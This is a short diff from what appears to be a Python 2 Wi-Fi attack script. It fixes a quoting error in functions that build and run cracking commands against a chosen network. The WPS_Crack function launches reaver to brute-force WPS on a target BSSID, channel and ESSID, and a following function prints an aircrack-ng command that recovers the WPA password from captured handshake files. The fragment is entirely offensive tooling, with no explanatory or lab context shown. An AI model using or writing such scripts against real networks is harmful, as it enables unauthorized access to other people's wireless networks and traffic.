@@ -104,8 +104,8 @@ def WPA_PSK():
    #print wpa.readlines("The wpa password is: ")
   
 def WPS_Crack():
-   print "reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid+"
-   os.system("gnome-terminal -x reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid+")
+   print "reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid
+   os.system("gnome-terminal -x reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid)
    
 def aircrack():
    print "aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc"
